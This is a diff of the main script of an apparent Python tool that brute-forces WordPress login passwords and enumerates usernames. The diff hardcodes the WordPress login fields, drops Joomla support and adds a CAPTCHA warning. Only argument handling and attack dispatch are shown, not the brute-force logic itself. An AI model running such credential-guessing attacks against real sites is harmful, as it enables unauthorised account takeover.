@@ -33,32 +33,24 @@ if __name__ == "__main__":
     # general settings
     options = get_arguments()
     mode = options.mode or "password"
-    user_thread = int(options.user_thread) or 1
+
+    if options.user_thread:
+        user_thread = int(options.user_thread) 
+    else:
+        user_thread = 1
+
     username = options.username or "admin"
     passwords_file = options.password_dictionary or "./cain.txt"
-    #usernames_file = "./facebook-firstnames.txt"
     usernames_file = options.username_dictionary or "./usernames_dict.txt"
-    cms = options.cms or 'wordpress'
     resume = options.resume or None
     
     # target specific settings
     target_url = options.target_url# or "http://10.0.2.7/wp-login.php"
     target_post = options.target_url# or "http://10.0.2.7/wp-login.php"
     
-    #for Joomla admin page
-    if cms == 'joomla':
-        username_field= "user"
-        password_field= "passwd"
-        success_check = ""
-    
-    #For wordpress admin page
-    elif cms == 'wordpress':
-        username_field= "log"
-        password_field= "pwd"
-        success_check = "Dashboard"
-    else:
-        print("CMS not found!")
-        exit(0)
+    username_field= "log"
+    password_field= "pwd"
+    success_check = "Dashboard"
     
     ##################################3
     #
@@ -71,16 +63,19 @@ if __name__ == "__main__":
             username = username, 
             passwords_list = passwords_file , 
             usernames_list = usernames_file , 
-            user_threads = user_thread,
-            cms=cms, resume = resume)
+            user_threads = int(user_thread),
+            resume = resume)
 
     if mode == 'password':
         print("Running password bruteforce attack!")
         bruter_obj.run_password_bruteforce()
 
     elif mode == 'user':
-        bruter_obj.run_username_bruteforce()
         print("Running username discovery attack!")
+        print("*********************************************************************")
+        print("IT SEEMS THAT THE USER ATTACK DOES NOT WORK IF THERE IS A CAPTCHA!!!!")
+        print("*********************************************************************")
+        bruter_obj.run_username_bruteforce()
     
         name_list = bruter_obj.get_discovered_usernames()
         print('########################')
